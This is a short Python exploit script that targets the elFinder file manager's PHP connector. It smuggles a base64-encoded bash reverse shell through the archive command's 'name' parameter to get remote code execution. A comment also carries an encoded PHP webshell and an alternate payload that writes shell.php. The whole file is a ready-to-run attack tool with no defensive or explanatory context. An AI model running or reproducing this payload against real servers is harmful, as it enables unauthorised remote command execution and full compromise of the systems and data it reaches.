import requests, sys, base64


if len(sys.argv) < 3:
	print('Usage: python3 reverse_shell.py <lhost> <lport> http://<ip>:<port>/elfinder')
	exit()

lhost = sys.argv[1]
lport = sys.argv[2]
URL = sys.argv[3]


# echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg== | base64 -d > shell.php
# Build reverse shell command
rev = f'bash -c "/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"'.encode('utf-8')

#print(rev)
# Base64 encode to prevent bad characters
payload = f'echo%20{(base64.b64encode(rev)).decode("utf-8")}%20%7C%20base64%20-d%20%7C%20bash'

#print(payload)
ENDPOINT = f'/php/connector.minimal.php?cmd=archive&name=-TvTT={payload}%20%23%202.zip&target=l1_Lw&targets%5B1%5D=l1_Mi56aXA&targets%5B0%5D=l1_MS50eHQ&type=application%2Fzip'


print("Sending reverse shell payload...")
print("Check netcat listener")
#ENDPOINT = '/php/connector.minimal.php?cmd=archive&name=-TvTT=id>shell.php # b.zip&target=l1_Lw&targets[1]=l1_Mi56aXA&targets[0]=l1_MS50eHQ&type=application/zip'
resp = requests.get(URL + ENDPOINT)

# Debug
print(resp.status_code)
print(resp.text)


print("Finished.")

